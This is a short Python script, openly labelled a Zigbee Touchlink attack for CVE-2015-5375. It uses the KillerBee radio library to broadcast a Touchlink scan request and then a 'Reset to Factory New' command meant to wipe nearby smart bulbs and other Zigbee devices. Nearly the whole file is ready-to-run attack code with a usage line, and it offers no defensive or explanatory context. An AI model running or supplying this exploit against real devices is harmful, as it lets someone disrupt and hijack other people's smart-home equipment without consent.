#!/usr/bin/env python3
"""
Zigbee Touchlink attack - factory reset bulbs/devices
CVE-2015-5375
"""

from killerbee import KillerBee
import struct

def touchlink_reset(target_channel=11):
    kb = KillerBee()
    kb.set_channel(target_channel)

    # Zigbee Light Link Scan Request (broadcast)
    scan_request = bytes.fromhex(
        "0108"  # Frame control
        "0000"  # Sequence
        "ffff"  # Dest PAN
        "ffffffffffffffff"  # Dest addr (broadcast)
        "0000"  # Src PAN
        "0000000000000000"  # Src addr
        "11"    # Cluster: Touchlink
        "00"    # Command: Scan Request
        "00000000"  # Transaction ID
        "04"    # Flags (factory new)
    )

    # Send scan request
    kb.inject(scan_request)

    print("[*] Sent Touchlink scan request")
    print("[*] Listening for responses...")

    # Receive scan responses (devices announce themselves)
    for i in range(10):
        packet = kb.pnext(timeout=1)
        if packet:
            print(f"[+] Response: {packet.hex()}")

    # Send Reset to Factory New Request
    reset_request = bytes.fromhex(
        "0108"
        "0100"
        "ffff"
        "ffffffffffffffff"
        "0000"
        "0000000000000000"
        "11"
        "07"  # Command: Reset to Factory New
        "00000000"
    )

    kb.inject(reset_request)
    print("[+] Sent factory reset command")

# Usage: touchlink_reset()
